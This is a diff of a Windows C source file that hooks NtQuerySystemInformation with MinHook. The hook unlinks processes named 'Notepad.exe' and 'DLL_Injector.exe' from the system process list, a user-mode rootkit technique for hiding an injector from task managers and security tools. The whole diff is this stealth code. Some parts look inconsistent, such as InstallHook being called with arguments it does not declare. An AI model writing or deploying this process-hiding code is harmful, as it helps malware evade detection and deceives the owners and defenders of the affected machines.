@@ -10,56 +10,69 @@
 #include <Shlwapi.h>
 
 
-fnNtQuerySystemInformation originalNtQuery;
+fnNtQuerySystemInformation __NtQuerySystemInformation;
 fnNtQuerySystemInformation newNtQuery;
 
 VOID InitHooks() {
 
     MH_Initialize();
-    InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);
+    InstallHook("NtQuerySystemInformation", &__NtQuerySystemInformation, &hookedNtQuery, &newNtQuery);
 
 }
 
 NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
-    NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+    NTSTATUS stat = newNtQuery(
+        SystemInformationClass,
+        SystemInformation,
+        SystemInformationLength,
+        ReturnLength);
 
-
-    if (SystemInformationClass == SystemProcessInformation && stat == 0) {
-
+    if (SystemProcessInformation == SystemInformationClass && stat == 0)
+    {
         PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
         PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);
 
-        while (TRUE) {
-
-            if (StringCompareA(curr->ImageName.Buffer, "notepad.exe")) {
-                prev->NextEntryOffset += curr->NextEntryOffset;
+        while (prev->NextEntryOffset != 0) {
+            if (!lstrcmp(curr->ImageName.Buffer, TEXT("Notepad.exe"))) {
+                if (curr->NextEntryOffset == 0) {
+                    prev->NextEntryOffset = 0;		// if above process is at last
+                }
+                else {
+                    prev->NextEntryOffset += curr->NextEntryOffset;
+                }
                 curr = prev;
             }
-
-            if (!curr->NextEntryOffset)
-                break;
-
+            if (!lstrcmp(curr->ImageName.Buffer, L"DLL_Injector.exe")) {
+                if (curr->NextEntryOffset == 0) {
+                    prev->NextEntryOffset = 0;
+                }
+                else {
+                    prev->NextEntryOffset += curr->NextEntryOffset;
+                }
+                curr = prev;
+            }
             prev = curr;
             curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
         }
     }
+
     return stat;
 }
 
 
 BOOL InstallHook() {
 
-    originalNtQuery = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
+    __NtQuerySystemInformation = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
 
     if (MH_Initialize() != MH_OK) {
         return FALSE;
     }
     
-    if (MH_CreateHook(originalNtQuery, &hookedNtQuery, &newNtQuery) != MH_OK) {
+    if (MH_CreateHook(__NtQuerySystemInformation, &hookedNtQuery, &newNtQuery) != MH_OK) {
         return FALSE;
     }
 
-    if (MH_EnableHook(originalNtQuery) != MH_OK) {
+    if (MH_EnableHook(__NtQuerySystemInformation) != MH_OK) {
         return FALSE;
     }
 
@@ -68,7 +81,7 @@ BOOL InstallHook() {
 
 BOOL UnHook() {
 
-    if (MH_DisableHook(originalNtQuery) != MH_OK) {
+    if (MH_DisableHook(__NtQuerySystemInformation) != MH_OK) {
         return FALSE;
     }
 
